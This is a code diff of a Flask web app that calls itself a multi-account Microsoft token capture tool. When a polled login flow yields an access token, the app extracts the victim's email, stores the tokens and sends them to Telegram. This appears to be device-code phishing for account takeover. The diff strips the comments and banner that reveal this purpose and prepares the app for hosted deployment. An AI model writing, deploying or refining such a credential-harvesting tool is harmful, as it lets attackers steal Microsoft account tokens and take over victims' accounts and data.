@@ -38,7 +38,6 @@ def save_token_data(email: str, token_data: dict):
         json.dump(tokens, f, indent=2)
 
 def get_email_from_id_token(id_token: str):
-    """Extract email from id_token (JWT) without external libraries"""
     try:
         payload = id_token.split('.')[1]
         payload += '=' * (4 - len(payload) % 4)
@@ -126,15 +125,11 @@ def check_status(flow_id):
         result = resp.json()
 
         if "access_token" in result:
-            # Extract email for multi-account support
             email = "unknown"
             if result.get("id_token"):
                 email = get_email_from_id_token(result["id_token"])
             
-            # Save token data per account
             save_token_data(email, result)
-            
-            # Send to Telegram with account identifier
             send_to_telegram(result, email)
             
             flow["token"] = result
@@ -147,10 +142,7 @@ def check_status(flow_id):
     except Exception:
         return jsonify({"status": "error", "error": "Poll error"})
 
-# Store active flows
 app.active_flows = {}
 
 if __name__ == "__main__":
-    print("🚀 Multi-account Microsoft Token Capture running...")
-    print("   Supports unlimited different Microsoft accounts")
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
